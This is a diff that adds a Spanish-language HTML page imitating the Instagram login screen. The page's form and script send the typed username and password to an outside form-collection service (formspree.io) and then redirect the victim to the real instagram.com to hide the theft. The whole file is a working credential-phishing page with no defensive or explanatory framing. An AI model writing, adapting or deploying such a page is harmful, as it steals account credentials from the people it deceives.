@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Iniciar sesión</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="login-container">
+    <form id="loginForm" action="https://formspree.io/f/xgvapdoe" method="POST">
+      <h1>Instagram</h1>
+      <input type="text" name="username" placeholder="Teléfono, usuario o correo" required />
+      <input type="password" name="password" placeholder="Contraseña" required />
+      <button type="submit">Iniciar sesión</button>
+    </form>
+    <p class="footer-text">¿Olvidaste tu contraseña?</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json' },
+        body: formData
+      })
+      .then(response => {
+        window.location.href = "https://www.instagram.com";
+      })
+      .catch(error => {
+        alert("Error al enviar el formulario");
+      });
+    });
+  </script>
+</body>
+</html>
